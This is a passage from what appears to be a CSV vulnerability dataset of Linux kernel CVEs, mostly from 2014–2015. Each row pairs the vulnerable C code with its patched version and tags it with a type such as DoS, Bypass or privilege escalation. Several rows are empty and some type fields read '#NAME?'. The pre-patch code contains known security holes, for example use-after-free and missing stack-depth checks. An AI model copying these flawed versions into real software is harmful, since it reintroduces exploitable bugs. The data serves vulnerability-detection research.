 if (bufs < pipe->buffers)
	.llseek		= no_llseek,
	.read		= new_sync_read,
	.read_iter	= pipe_read,
	.write		= new_sync_write,
	.write_iter	= pipe_write,
	.poll		= pipe_poll,
	.unlocked_ioctl	= pipe_ioctl,
	.release	= pipe_release,
size_t iov_iter_single_seg_count(const struct iov_iter *i);
size_t copy_page_to_iter(struct page *page, size_t offset, size_t bytes,
 struct iov_iter *i);
size_t copy_page_from_iter(struct page *page, size_t offset, size_t bytes,
 struct iov_iter *i);
unsigned long iov_iter_alignment(const struct iov_iter *i);
void iov_iter_init(struct iov_iter *i, int direction, const struct iovec *iov,
 unsigned long nr_segs, size_t count);
}
EXPORT_SYMBOL(copy_page_to_iter);

size_t copy_page_from_iter(struct page *page, size_t offset, size_t bytes,
 struct iov_iter *i)
{
 size_t skip, copy, left, wanted;
 const struct iovec *iov;
 char __user *buf;
 void *kaddr, *to;

 if (unlikely(bytes > i->count))
		bytes = i->count;

 if (unlikely(!bytes))
 return 0;

	wanted = bytes;
	iov = i->iov;
	skip = i->iov_offset;
	buf = iov->iov_base + skip;
	copy = min(bytes, iov->iov_len - skip);

 if (!fault_in_pages_readable(buf, copy)) {
		kaddr = kmap_atomic(page);
		to = kaddr + offset;

 /* first chunk, usually the only one */
		left = __copy_from_user_inatomic(to, buf, copy);
		copy -= left;
		skip += copy;
		to += copy;
		bytes -= copy;

 while (unlikely(!left && bytes)) {
			iov++;
			buf = iov->iov_base;
			copy = min(bytes, iov->iov_len);
			left = __copy_from_user_inatomic(to, buf, copy);
			copy -= left;
			skip = copy;
			to += copy;
			bytes -= copy;
		}
 if (likely(!bytes)) {
 kunmap_atomic(kaddr);
 goto done;
		}
		offset = to - kaddr;
		buf += copy;
 kunmap_atomic(kaddr);
		copy = min(bytes, iov->iov_len - skip);
	}
 /* Too bad - revert to non-atomic kmap */
	kaddr = kmap(page);
	to = kaddr + offset;
	left = __copy_from_user(to, buf, copy);
	copy -= left;
	skip += copy;
	to += copy;
	bytes -= copy;
 while (unlikely(!left && bytes)) {
		iov++;
		buf = iov->iov_base;
		copy = min(bytes, iov->iov_len);
		left = __copy_from_user(to, buf, copy);
		copy -= left;
		skip = copy;
		to += copy;
		bytes -= copy;
	}
 kunmap(page);
done:
	i->count -= wanted - bytes;
	i->nr_segs -= iov - i->iov;
	i->iov = iov;
	i->iov_offset = skip;
 return wanted - bytes;
}
EXPORT_SYMBOL(copy_page_from_iter);

static size_t __iovec_copy_from_user_inatomic(char *vaddr,
 const struct iovec *iov, size_t base, size_t bytes)
{
"
2015,Bypass ,CVE-2015-1593,"	.flags = -1,
};

static unsigned int stack_maxrandom_size(void)
{
 unsigned int max = 0;
 if ((current->flags & PF_RANDOMIZE) &&
		!(current->personality & ADDR_NO_RANDOMIZE)) {
		max = ((-1U) & STACK_RND_MASK) << PAGE_SHIFT;
	}

 return max;

static unsigned long randomize_stack_top(unsigned long stack_top)
{
 unsigned int random_variable = 0;

 if ((current->flags & PF_RANDOMIZE) &&
		!(current->personality & ADDR_NO_RANDOMIZE)) {
		random_variable = get_random_int() & STACK_RND_MASK;

		random_variable <<= PAGE_SHIFT;
	}
#ifdef CONFIG_STACK_GROWSUP
","	.flags = -1,
};

static unsigned long stack_maxrandom_size(void)
{
 unsigned long max = 0;
 if ((current->flags & PF_RANDOMIZE) &&
		!(current->personality & ADDR_NO_RANDOMIZE)) {
		max = ((-1UL) & STACK_RND_MASK) << PAGE_SHIFT;
	}

 return max;

static unsigned long randomize_stack_top(unsigned long stack_top)
{
 unsigned long random_variable = 0;

 if ((current->flags & PF_RANDOMIZE) &&
		!(current->personality & ADDR_NO_RANDOMIZE)) {
		random_variable = (unsigned long) get_random_int();
		random_variable &= STACK_RND_MASK;
		random_variable <<= PAGE_SHIFT;
	}
#ifdef CONFIG_STACK_GROWSUP
"
2016,DoS ,CVE-2015-1573," struct nft_chain *chain, *nc;
 struct nft_set *set, *ns;

 list_for_each_entry_safe(chain, nc, &ctx->table->chains, list) {
		ctx->chain = chain;

		err = nft_delrule_by_chain(ctx);
 if (err < 0)
 goto out;

		err = nft_delchain(ctx);
 if (err < 0)
 goto out;
	}

 list_for_each_entry_safe(set, ns, &ctx->table->sets, list) {
 goto out;
	}









	err = nft_deltable(ctx);
out:
 return err;
"," struct nft_chain *chain, *nc;
 struct nft_set *set, *ns;

 list_for_each_entry(chain, &ctx->table->chains, list) {
		ctx->chain = chain;

		err = nft_delrule_by_chain(ctx);
 if (err < 0)
 goto out;




	}

 list_for_each_entry_safe(set, ns, &ctx->table->sets, list) {
 goto out;
	}

 list_for_each_entry_safe(chain, nc, &ctx->table->chains, list) {
		ctx->chain = chain;

		err = nft_delchain(ctx);
 if (err < 0)
 goto out;
	}

	err = nft_deltable(ctx);
out:
 return err;
"
2015,DoS ,CVE-2015-1465," struct ip_options	opt;		/* Compiled IP options		*/
 unsigned char		flags;

#define IPSKB_FORWARDED 1
#define IPSKB_XFRM_TUNNEL_SIZE 2
#define IPSKB_XFRM_TRANSFORMED 4
#define IPSKB_FRAG_COMPLETE 8
#define IPSKB_REROUTED 16


	u16			frag_max_size;
};
	 *	We now generate an ICMP HOST REDIRECT giving the route
	 *	we calculated.
 */
 if (rt->rt_flags&RTCF_DOREDIRECT && !opt->srr && !skb_sec_path(skb))

 ip_rt_send_redirect(skb);

	skb->priority = rt_tos2priority(iph->tos);

	do_cache = res->fi && !itag;
 if (out_dev == in_dev && err && IN_DEV_TX_REDIRECTS(out_dev) &&

	    (IN_DEV_SHARED_MEDIA(out_dev) ||
 inet_addr_onlink(out_dev, saddr, FIB_RES_GW(*res)))) {
		flags |= RTCF_DOREDIRECT;
		do_cache = false;
	}

 if (skb->protocol != htons(ETH_P_IP)) {
 /* Not IP (i.e. ARP). Do not create route, if it is
	r->rtm_flags	= (rt->rt_flags & ~0xFFFF) | RTM_F_CLONED;
 if (rt->rt_flags & RTCF_NOTIFY)
		r->rtm_flags |= RTM_F_NOTIFY;



 if (nla_put_be32(skb, RTA_DST, dst))
 goto nla_put_failure;
"," struct ip_options	opt;		/* Compiled IP options		*/
 unsigned char		flags;

#define IPSKB_FORWARDED BIT(0)
#define IPSKB_XFRM_TUNNEL_SIZE BIT(1)
#define IPSKB_XFRM_TRANSFORMED BIT(2)
#define IPSKB_FRAG_COMPLETE BIT(3)
#define IPSKB_REROUTED BIT(4)
#define IPSKB_DOREDIRECT BIT(5)

	u16			frag_max_size;
};
	 *	We now generate an ICMP HOST REDIRECT giving the route
	 *	we calculated.
 */
 if (IPCB(skb)->flags & IPSKB_DOREDIRECT && !opt->srr &&
	    !skb_sec_path(skb))
 ip_rt_send_redirect(skb);

	skb->priority = rt_tos2priority(iph->tos);

	do_cache = res->fi && !itag;
 if (out_dev == in_dev && err && IN_DEV_TX_REDIRECTS(out_dev) &&
	    skb->protocol == htons(ETH_P_IP) &&
	    (IN_DEV_SHARED_MEDIA(out_dev) ||
 inet_addr_onlink(out_dev, saddr, FIB_RES_GW(*res))))
 IPCB(skb)->flags |= IPSKB_DOREDIRECT;



 if (skb->protocol != htons(ETH_P_IP)) {
 /* Not IP (i.e. ARP). Do not create route, if it is
	r->rtm_flags	= (rt->rt_flags & ~0xFFFF) | RTM_F_CLONED;
 if (rt->rt_flags & RTCF_NOTIFY)
		r->rtm_flags |= RTM_F_NOTIFY;
 if (IPCB(skb)->flags & IPSKB_DOREDIRECT)
		r->rtm_flags |= RTCF_DOREDIRECT;

 if (nla_put_be32(skb, RTA_DST, dst))
 goto nla_put_failure;
"
2015,DoS ,CVE-2015-1421,"	asoc->peer.peer_hmacs = new->peer.peer_hmacs;
	new->peer.peer_hmacs = NULL;

 sctp_auth_key_put(asoc->asoc_shared_key);
 sctp_auth_asoc_init_active_key(asoc, GFP_ATOMIC);
}

","	asoc->peer.peer_hmacs = new->peer.peer_hmacs;
	new->peer.peer_hmacs = NULL;


 sctp_auth_asoc_init_active_key(asoc, GFP_ATOMIC);
}

"
2015,Bypass ,CVE-2015-1420,,
2016,DoS ,CVE-2015-1350,,
2016,DoS ,CVE-2015-1339," unregister_chrdev_region(cc->cdev->dev, 1);
 cdev_del(cc->cdev);
	}



	rc = fuse_dev_release(inode, file);	/* puts the base reference */

"," unregister_chrdev_region(cc->cdev->dev, 1);
 cdev_del(cc->cdev);
	}
 /* Base reference is now owned by ""fud"" */
 fuse_conn_put(&cc->fc);

	rc = fuse_dev_release(inode, file);	/* puts the base reference */

"
2015,DoS Overflow ,CVE-2015-1333," if (index_key->type == &key_type_keyring)
 up_write(&keyring_serialise_link_sem);

 if (edit && !edit->dead_leaf) {
 key_payload_reserve(keyring,
				    keyring->datalen - KEYQUOTA_LINK_BYTES);


 assoc_array_cancel_edit(edit);
	}
 up_write(&keyring->sem);
"," if (index_key->type == &key_type_keyring)
 up_write(&keyring_serialise_link_sem);

 if (edit) {
 if (!edit->dead_leaf) {
 key_payload_reserve(keyring,
				keyring->datalen - KEYQUOTA_LINK_BYTES);
		}
 assoc_array_cancel_edit(edit);
	}
 up_write(&keyring->sem);
"
2016,,CVE-2015-1328,,
2016,DoS ,CVE-2015-0573,,
2016,DoS ,CVE-2015-0572,,
2016,#NAME?,CVE-2015-0571,,
2016,Overflow +Priv ,CVE-2015-0570,,
2016,Overflow +Priv ,CVE-2015-0569,,
2016,DoS +Priv Mem. Corr. ,CVE-2015-0568,,
2015,DoS ,CVE-2015-0275," else
		max_blocks -= lblk;

	flags = EXT4_GET_BLOCKS_CREATE_UNWRIT_EXT |
		EXT4_GET_BLOCKS_CONVERT_UNWRITTEN |
		EXT4_EX_NOCACHE;
 if (mode & FALLOC_FL_KEEP_SIZE)
		flags |= EXT4_GET_BLOCKS_KEEP_SIZE;

 mutex_lock(&inode->i_mutex);

 /*
		ret = inode_newsize_ok(inode, new_size);
 if (ret)
 goto out_mutex;
 /*
		 * If we have a partial block after EOF we have to allocate
		 * the entire block.
 */
 if (partial_end)
			max_blocks += 1;
	}


















 if (max_blocks > 0) {



 /* Now release the pages and zero block aligned part of pages*/
 truncate_pagecache_range(inode, start, end - 1);
"," else
		max_blocks -= lblk;







 mutex_lock(&inode->i_mutex);

 /*
		ret = inode_newsize_ok(inode, new_size);
 if (ret)
 goto out_mutex;






	}

	flags = EXT4_GET_BLOCKS_CREATE_UNWRIT_EXT;
 if (mode & FALLOC_FL_KEEP_SIZE)
		flags |= EXT4_GET_BLOCKS_KEEP_SIZE;

 /* Preallocate the range including the unaligned edges */
 if (partial_begin || partial_end) {
		ret = ext4_alloc_file_blocks(file,
 round_down(offset, 1 << blkbits) >> blkbits,
				(round_up((offset + len), 1 << blkbits) -
 round_down(offset, 1 << blkbits)) >> blkbits,
				new_size, flags, mode);
 if (ret)
 goto out_mutex;

	}

 /* Zero range excluding the unaligned edges */
 if (max_blocks > 0) {
		flags |= (EXT4_GET_BLOCKS_CONVERT_UNWRITTEN |
			  EXT4_EX_NOCACHE);

 /* Now release the pages and zero block aligned part of pages*/
 truncate_pagecache_range(inode, start, end - 1);
"
2015,DoS +Priv ,CVE-2015-0274,"		 * Out of line attribute, cannot double split, but
		 * make room for the attribute value itself.
 */
 uint	dblocks = XFS_B_TO_FSB(mp, valuelen);
		nblks += dblocks;
		nblks += XFS_NEXTENTADD_SPACE_RES(mp, dblocks, XFS_ATTR_FORK);
	}

 trace_xfs_attr_leaf_replace(args);


		args->op_flags |= XFS_DA_OP_RENAME;	/* an atomic rename */
		args->blkno2 = args->blkno;		/* set 2nd entry info*/
		args->index2 = args->index;
		args->rmtblkno2 = args->rmtblkno;
		args->rmtblkcnt2 = args->rmtblkcnt;










	}

 /*
		args->blkno = args->blkno2;
		args->rmtblkno = args->rmtblkno2;
		args->rmtblkcnt = args->rmtblkcnt2;

 if (args->rmtblkno) {
			error = xfs_attr_rmtval_remove(args);
 if (error)

 trace_xfs_attr_node_replace(args);


		args->op_flags |= XFS_DA_OP_RENAME;	/* atomic rename op */
		args->blkno2 = args->blkno;		/* set 2nd entry info*/
		args->index2 = args->index;
		args->rmtblkno2 = args->rmtblkno;
		args->rmtblkcnt2 = args->rmtblkcnt;







		args->rmtblkno = 0;
		args->rmtblkcnt = 0;

	}

	retval = xfs_attr3_leaf_add(blk->bp, state->args);
		args->blkno = args->blkno2;
		args->rmtblkno = args->rmtblkno2;
		args->rmtblkcnt = args->rmtblkcnt2;

 if (args->rmtblkno) {
			error = xfs_attr_rmtval_remove(args);
 if (error)
		name_rmt->valueblk = 0;
		args->rmtblkno = 1;
		args->rmtblkcnt = xfs_attr3_rmt_blocks(mp, args->valuelen);

	}
 xfs_trans_log_buf(args->trans, bp,
 XFS_DA_LOGRANGE(leaf, xfs_attr3_leaf_name(leaf, args->index),
 if (!xfs_attr_namesp_match(args->flags, entry->flags))
 continue;
			args->index = probe;
			args->valuelen = be32_to_cpu(name_rmt->valuelen);
			args->rmtblkno = be32_to_cpu(name_rmt->valueblk);
			args->rmtblkcnt = xfs_attr3_rmt_blocks(
							args->dp->i_mount,
							args->valuelen);
 return XFS_ERROR(EEXIST);
		}
	}
		name_rmt = xfs_attr3_leaf_name_remote(leaf, args->index);
 ASSERT(name_rmt->namelen == args->namelen);
 ASSERT(memcmp(args->name, name_rmt->name, args->namelen) == 0);
 valuelen = be32_to_cpu(name_rmt->valuelen);
		args->rmtblkno = be32_to_cpu(name_rmt->valueblk);
		args->rmtblkcnt = xfs_attr3_rmt_blocks(args->dp->i_mount,
 valuelen);
 if (args->flags & ATTR_KERNOVAL) {
			args->valuelen = valuelen;
 return 0;
		}
 if (args->valuelen < valuelen) {
			args->valuelen = valuelen;
 return XFS_ERROR(ERANGE);
		}
		args->valuelen = valuelen;
	}
 return 0;
}
 ASSERT((entry->flags & XFS_ATTR_LOCAL) == 0);
		name_rmt = xfs_attr3_leaf_name_remote(leaf, args->index);
		name_rmt->valueblk = cpu_to_be32(args->rmtblkno);
		name_rmt->valuelen = cpu_to_be32(args->valuelen);
 xfs_trans_log_buf(args->trans, bp,
 XFS_DA_LOGRANGE(leaf, name_rmt, sizeof(*name_rmt)));
	}
 ASSERT((entry1->flags & XFS_ATTR_LOCAL) == 0);
		name_rmt = xfs_attr3_leaf_name_remote(leaf1, args->index);
		name_rmt->valueblk = cpu_to_be32(args->rmtblkno);
		name_rmt->valuelen = cpu_to_be32(args->valuelen);
 xfs_trans_log_buf(args->trans, bp1,
 XFS_DA_LOGRANGE(leaf1, name_rmt, sizeof(*name_rmt)));
	}
				args.dp = context->dp;
				args.whichfork = XFS_ATTR_FORK;
				args.valuelen = valuelen;

				args.value = kmem_alloc(valuelen, KM_SLEEP | KM_NOFS);
				args.rmtblkno = be32_to_cpu(name_rmt->valueblk);
				args.rmtblkcnt = xfs_attr3_rmt_blocks(
 struct xfs_buf		*bp;
 xfs_dablk_t		lblkno = args->rmtblkno;
 __uint8_t		*dst = args->value;
 int			valuelen = args->valuelen;
 int			nmap;
 int			error;
 int			blkcnt = args->rmtblkcnt;
 trace_xfs_attr_rmtval_get(args);

 ASSERT(!(args->flags & ATTR_KERNOVAL));



 while (valuelen > 0) {
		nmap = ATTR_RMTVALUE_MAPSIZE;
		error = xfs_bmapi_read(args->dp, (xfs_fileoff_t)lblkno,
	 * attributes have headers, we can't just do a straight byte to FSB
	 * conversion and have to take the header space into account.
 */
	blkcnt = xfs_attr3_rmt_blocks(mp, args->valuelen);
	error = xfs_bmap_first_unused(args->trans, args->dp, blkcnt, &lfileoff,
						   XFS_ATTR_FORK);
 if (error)
 */
	lblkno = args->rmtblkno;
	blkcnt = args->rmtblkcnt;
	valuelen = args->valuelen;
 while (valuelen > 0) {
 struct xfs_buf	*bp;
 xfs_daddr_t	dblkno;
 int index;		/* index of attr of interest in blk */
 xfs_dablk_t	rmtblkno;	/* remote attr value starting blkno */
 int		rmtblkcnt;	/* remote attr value block count */

 xfs_dablk_t	blkno2;		/* blkno of 2nd attr leaf of interest */
 int		index2;		/* index of 2nd attr in blk */
 xfs_dablk_t	rmtblkno2;	/* remote attr value starting blkno */
 int		rmtblkcnt2;	/* remote attr value block count */

 int		op_flags;	/* operation flags */
 enum xfs_dacmp	cmpresult;	/* name compare result for lookups */
} xfs_da_args_t;
","		 * Out of line attribute, cannot double split, but
		 * make room for the attribute value itself.
 */
 uint	dblocks = xfs_attr3_rmt_blocks(mp, valuelen);
		nblks += dblocks;
		nblks += XFS_NEXTENTADD_SPACE_RES(mp, dblocks, XFS_ATTR_FORK);
	}

 trace_xfs_attr_leaf_replace(args);

 /* save the attribute state for later removal*/
		args->op_flags |= XFS_DA_OP_RENAME;	/* an atomic rename */
		args->blkno2 = args->blkno;		/* set 2nd entry info*/
		args->index2 = args->index;
		args->rmtblkno2 = args->rmtblkno;
		args->rmtblkcnt2 = args->rmtblkcnt;
		args->rmtvaluelen2 = args->rmtvaluelen;

 /*
		 * clear the remote attr state now that it is saved so that the
		 * values reflect the state of the attribute we are about to
		 * add, not the attribute we just found and will remove later.
 */
		args->rmtblkno = 0;
		args->rmtblkcnt = 0;
		args->rmtvaluelen = 0;
	}

 /*
		args->blkno = args->blkno2;
		args->rmtblkno = args->rmtblkno2;
		args->rmtblkcnt = args->rmtblkcnt2;
		args->rmtvaluelen = args->rmtvaluelen2;
 if (args->rmtblkno) {
			error = xfs_attr_rmtval_remove(args);
 if (error)

 trace_xfs_attr_node_replace(args);

 /* save the attribute state for later removal*/
		args->op_flags |= XFS_DA_OP_RENAME;	/* atomic rename op */
		args->blkno2 = args->blkno;		/* set 2nd entry info*/
		args->index2 = args->index;
		args->rmtblkno2 = args->rmtblkno;
		args->rmtblkcnt2 = args->rmtblkcnt;
		args->rmtvaluelen2 = args->rmtvaluelen;

 /*
		 * clear the remote attr state now that it is saved so that the
		 * values reflect the state of the attribute we are about to
		 * add, not the attribute we just found and will remove later.
 */
		args->rmtblkno = 0;
		args->rmtblkcnt = 0;
		args->rmtvaluelen = 0;
	}

	retval = xfs_attr3_leaf_add(blk->bp, state->args);
		args->blkno = args->blkno2;
		args->rmtblkno = args->rmtblkno2;
		args->rmtblkcnt = args->rmtblkcnt2;
		args->rmtvaluelen = args->rmtvaluelen2;
 if (args->rmtblkno) {
			error = xfs_attr_rmtval_remove(args);
 if (error)
		name_rmt->valueblk = 0;
		args->rmtblkno = 1;
		args->rmtblkcnt = xfs_attr3_rmt_blocks(mp, args->valuelen);
		args->rmtvaluelen = args->valuelen;
	}
 xfs_trans_log_buf(args->trans, bp,
 XFS_DA_LOGRANGE(leaf, xfs_attr3_leaf_name(leaf, args->index),
 if (!xfs_attr_namesp_match(args->flags, entry->flags))
 continue;
			args->index = probe;
			args->rmtvaluelen = be32_to_cpu(name_rmt->valuelen);
			args->rmtblkno = be32_to_cpu(name_rmt->valueblk);
			args->rmtblkcnt = xfs_attr3_rmt_blocks(
							args->dp->i_mount,
							args->rmtvaluelen);
 return XFS_ERROR(EEXIST);
		}
	}
		name_rmt = xfs_attr3_leaf_name_remote(leaf, args->index);
 ASSERT(name_rmt->namelen == args->namelen);
 ASSERT(memcmp(args->name, name_rmt->name, args->namelen) == 0);
 args->rmtvaluelen = be32_to_cpu(name_rmt->valuelen);
		args->rmtblkno = be32_to_cpu(name_rmt->valueblk);
		args->rmtblkcnt = xfs_attr3_rmt_blocks(args->dp->i_mount,
 args->rmtvaluelen);
 if (args->flags & ATTR_KERNOVAL) {
			args->valuelen = args->rmtvaluelen;
 return 0;
		}
 if (args->valuelen < args->rmtvaluelen) {
			args->valuelen = args->rmtvaluelen;
 return XFS_ERROR(ERANGE);
		}
		args->valuelen = args->rmtvaluelen;
	}
 return 0;
}
 ASSERT((entry->flags & XFS_ATTR_LOCAL) == 0);
		name_rmt = xfs_attr3_leaf_name_remote(leaf, args->index);
		name_rmt->valueblk = cpu_to_be32(args->rmtblkno);
		name_rmt->valuelen = cpu_to_be32(args->rmtvaluelen);
 xfs_trans_log_buf(args->trans, bp,
 XFS_DA_LOGRANGE(leaf, name_rmt, sizeof(*name_rmt)));
	}
 ASSERT((entry1->flags & XFS_ATTR_LOCAL) == 0);
		name_rmt = xfs_attr3_leaf_name_remote(leaf1, args->index);
		name_rmt->valueblk = cpu_to_be32(args->rmtblkno);
		name_rmt->valuelen = cpu_to_be32(args->rmtvaluelen);
 xfs_trans_log_buf(args->trans, bp1,
 XFS_DA_LOGRANGE(leaf1, name_rmt, sizeof(*name_rmt)));
	}
				args.dp = context->dp;
				args.whichfork = XFS_ATTR_FORK;
				args.valuelen = valuelen;
				args.rmtvaluelen = valuelen;
				args.value = kmem_alloc(valuelen, KM_SLEEP | KM_NOFS);
				args.rmtblkno = be32_to_cpu(name_rmt->valueblk);
				args.rmtblkcnt = xfs_attr3_rmt_blocks(
 struct xfs_buf		*bp;
 xfs_dablk_t		lblkno = args->rmtblkno;
 __uint8_t		*dst = args->value;
 int			valuelen;
 int			nmap;
 int			error;
 int			blkcnt = args->rmtblkcnt;
 trace_xfs_attr_rmtval_get(args);

 ASSERT(!(args->flags & ATTR_KERNOVAL));
 ASSERT(args->rmtvaluelen == args->valuelen);

	valuelen = args->rmtvaluelen;
 while (valuelen > 0) {
		nmap = ATTR_RMTVALUE_MAPSIZE;
		error = xfs_bmapi_read(args->dp, (xfs_fileoff_t)lblkno,
	 * attributes have headers, we can't just do a straight byte to FSB
	 * conversion and have to take the header space into account.
 */
	blkcnt = xfs_attr3_rmt_blocks(mp, args->rmtvaluelen);
	error = xfs_bmap_first_unused(args->trans, args->dp, blkcnt, &lfileoff,
						   XFS_ATTR_FORK);
 if (error)
 */
	lblkno = args->rmtblkno;
	blkcnt = args->rmtblkcnt;
	valuelen = args->rmtvaluelen;
 while (valuelen > 0) {
 struct xfs_buf	*bp;
 xfs_daddr_t	dblkno;
 int index;		/* index of attr of interest in blk */
 xfs_dablk_t	rmtblkno;	/* remote attr value starting blkno */
 int		rmtblkcnt;	/* remote attr value block count */
 int		rmtvaluelen;	/* remote attr value length in bytes */
 xfs_dablk_t	blkno2;		/* blkno of 2nd attr leaf of interest */
 int		index2;		/* index of 2nd attr in blk */
 xfs_dablk_t	rmtblkno2;	/* remote attr value starting blkno */
 int		rmtblkcnt2;	/* remote attr value block count */
 int		rmtvaluelen2;	/* remote attr value length in bytes */
 int		op_flags;	/* operation flags */
 enum xfs_dacmp	cmpresult;	/* name compare result for lookups */
} xfs_da_args_t;
"
2015,DoS +Priv ,CVE-2015-0239,"	 * Not recognized on AMD in compat mode (but is recognized in legacy
	 * mode).
	 */
	if ((ctxt->mode == X86EMUL_MODE_PROT32) && (efer & EFER_LMA)
	    && !vendor_intel(ctxt))
		return emulate_ud(ctxt);

	setup_syscalls_segments(ctxt, &cs, &ss);

	ops->get_msr(ctxt, MSR_IA32_SYSENTER_CS, &msr_data);
	switch (ctxt->mode) {
	case X86EMUL_MODE_PROT32:
		if ((msr_data & 0xfffc) == 0x0)
			return emulate_gp(ctxt, 0);
		break;
	case X86EMUL_MODE_PROT64:
		if (msr_data == 0x0)
			return emulate_gp(ctxt, 0);
		break;
	default:
		break;
	}

	ctxt->eflags &= ~(EFLG_VM | EFLG_IF);
	cs_sel = (u16)msr_data;
	cs_sel &= ~SELECTOR_RPL_MASK;
	ss_sel = cs_sel + 8;
	ss_sel &= ~SELECTOR_RPL_MASK;
	if (ctxt->mode == X86EMUL_MODE_PROT64 || (efer & EFER_LMA)) {
		cs.d = 0;
		cs.l = 1;
	}
	ops->set_segment(ctxt, ss_sel, &ss, 0, VCPU_SREG_SS);

	ops->get_msr(ctxt, MSR_IA32_SYSENTER_EIP, &msr_data);
	ctxt->_eip = msr_data;

	ops->get_msr(ctxt, MSR_IA32_SYSENTER_ESP, &msr_data);
	*reg_write(ctxt, VCPU_REGS_RSP) = msr_data;


	return X86EMUL_CONTINUE;
}
","	 * Not recognized on AMD in compat mode (but is recognized in legacy
	 * mode).
	 */
	if ((ctxt->mode != X86EMUL_MODE_PROT64) && (efer & EFER_LMA)
	    && !vendor_intel(ctxt))
		return emulate_ud(ctxt);

	setup_syscalls_segments(ctxt, &cs, &ss);

	ops->get_msr(ctxt, MSR_IA32_SYSENTER_CS, &msr_data);
	if ((msr_data & 0xfffc) == 0x0)
		return emulate_gp(ctxt, 0);











	ctxt->eflags &= ~(EFLG_VM | EFLG_IF);
	cs_sel = (u16)msr_data & ~SELECTOR_RPL_MASK;

	ss_sel = cs_sel + 8;
	if (efer & EFER_LMA) {

		cs.d = 0;
		cs.l = 1;
	}
	ops->set_segment(ctxt, ss_sel, &ss, 0, VCPU_SREG_SS);

	ops->get_msr(ctxt, MSR_IA32_SYSENTER_EIP, &msr_data);
	ctxt->_eip = (efer & EFER_LMA) ? msr_data : (u32)msr_data;

	ops->get_msr(ctxt, MSR_IA32_SYSENTER_ESP, &msr_data);
	*reg_write(ctxt, VCPU_REGS_RSP) = (efer & EFER_LMA) ? msr_data :
							      (u32)msr_data;

	return X86EMUL_CONTINUE;
}
"
2017,DoS +Priv ,CVE-2014-9940," gpiod_put(pin->gpiod);
 list_del(&pin->list);
 kfree(pin);


			} else {
				pin->request_count--;
			}
"," gpiod_put(pin->gpiod);
 list_del(&pin->list);
 kfree(pin);
				rdev->ena_pin = NULL;
 return;
			} else {
				pin->request_count--;
			}
"
2017,#NAME?,CVE-2014-9922,"	s->s_maxbytes = path.dentry->d_sb->s_maxbytes;
	s->s_blocksize = path.dentry->d_sb->s_blocksize;
	s->s_magic = ECRYPTFS_SUPER_MAGIC;








	inode = ecryptfs_get_inode(path.dentry->d_inode, s);
	rc = PTR_ERR(inode);
	}
	ufs->lower_namelen = statfs.f_namelen;










	ufs->upper_mnt = clone_private_mount(&upperpath);
	err = PTR_ERR(ufs->upper_mnt);
 if (IS_ERR(ufs->upper_mnt)) {
 */
#include <linux/quota.h>







/** 
 * enum positive_aop_returns - aop return codes with specific semantics
 *
 struct list_lru		s_dentry_lru ____cacheline_aligned_in_smp;
 struct list_lru		s_inode_lru ____cacheline_aligned_in_smp;
 struct rcu_head		rcu;





};

extern struct timespec current_fs_time(struct super_block *sb);
","	s->s_maxbytes = path.dentry->d_sb->s_maxbytes;
	s->s_blocksize = path.dentry->d_sb->s_blocksize;
	s->s_magic = ECRYPTFS_SUPER_MAGIC;
	s->s_stack_depth = path.dentry->d_sb->s_stack_depth + 1;

	rc = -EINVAL;
 if (s->s_stack_depth > FILESYSTEM_MAX_STACK_DEPTH) {
 pr_err(""eCryptfs: maximum fs stacking depth exceeded\n"");
 goto out_free;
	}

	inode = ecryptfs_get_inode(path.dentry->d_inode, s);
	rc = PTR_ERR(inode);
	}
	ufs->lower_namelen = statfs.f_namelen;

	sb->s_stack_depth = max(upperpath.mnt->mnt_sb->s_stack_depth,
				lowerpath.mnt->mnt_sb->s_stack_depth) + 1;

	err = -EINVAL;
 if (sb->s_stack_depth > FILESYSTEM_MAX_STACK_DEPTH) {
 pr_err(""overlayfs: maximum fs stacking depth exceeded\n"");
 goto out_put_workpath;
	}

	ufs->upper_mnt = clone_private_mount(&upperpath);
	err = PTR_ERR(ufs->upper_mnt);
 if (IS_ERR(ufs->upper_mnt)) {
 */
#include <linux/quota.h>

/*
 * Maximum number of layers of fs stack.  Needs to be limited to
 * prevent kernel stack overflow
 */
#define FILESYSTEM_MAX_STACK_DEPTH 2

/** 
 * enum positive_aop_returns - aop return codes with specific semantics
 *
 struct list_lru		s_dentry_lru ____cacheline_aligned_in_smp;
 struct list_lru		s_inode_lru ____cacheline_aligned_in_smp;
 struct rcu_head		rcu;

 /*
	 * Indicates how deep in a filesystem stack this SB is
 */
 int s_stack_depth;
};

extern struct timespec current_fs_time(struct super_block *sb);
"
2017,DoS +Priv ,CVE-2014-9914,"}
EXPORT_SYMBOL(ip4_datagram_connect);





void ip4_datagram_release_cb(struct sock *sk)
{
 const struct inet_sock *inet = inet_sk(sk);
 const struct ip_options_rcu *inet_opt;
	__be32 daddr = inet->inet_daddr;

 struct flowi4 fl4;
 struct rtable *rt;

 if (! __sk_dst_get(sk) || __sk_dst_check(sk, 0))
 return;

 rcu_read_lock();






	inet_opt = rcu_dereference(inet->inet_opt);
 if (inet_opt && inet_opt->opt.srr)
		daddr = inet_opt->opt.faddr;
	rt = ip_route_output_ports(sock_net(sk), &fl4, sk, daddr,
				   inet->inet_saddr, inet->inet_dport,
				   inet->inet_sport, sk->sk_protocol,
 RT_CONN_FLAGS(sk), sk->sk_bound_dev_if);
 if (!IS_ERR(rt))
 __sk_dst_set(sk, &rt->dst);


 rcu_read_unlock();
}
EXPORT_SYMBOL_GPL(ip4_datagram_release_cb);
","}
EXPORT_SYMBOL(ip4_datagram_connect);

/* Because UDP xmit path can manipulate sk_dst_cache without holding
 * socket lock, we need to use sk_dst_set() here,
 * even if we own the socket lock.
 */
void ip4_datagram_release_cb(struct sock *sk)
{
 const struct inet_sock *inet = inet_sk(sk);
 const struct ip_options_rcu *inet_opt;
	__be32 daddr = inet->inet_daddr;
 struct dst_entry *dst;
 struct flowi4 fl4;
 struct rtable *rt;




 rcu_read_lock();

	dst = __sk_dst_get(sk);
 if (!dst || !dst->obsolete || dst->ops->check(dst, 0)) {
 rcu_read_unlock();
 return;
	}
	inet_opt = rcu_dereference(inet->inet_opt);
 if (inet_opt && inet_opt->opt.srr)
		daddr = inet_opt->opt.faddr;
	rt = ip_route_output_ports(sock_net(sk), &fl4, sk, daddr,
				   inet->inet_saddr, inet->inet_dport,
				   inet->inet_sport, sk->sk_protocol,
 RT_CONN_FLAGS(sk), sk->sk_bound_dev_if);

	dst = !IS_ERR(rt) ? &rt->dst : NULL;
 sk_dst_set(sk, dst);

 rcu_read_unlock();
}
EXPORT_SYMBOL_GPL(ip4_datagram_release_cb);
"
2016,DoS Overflow ,CVE-2014-9904,"{
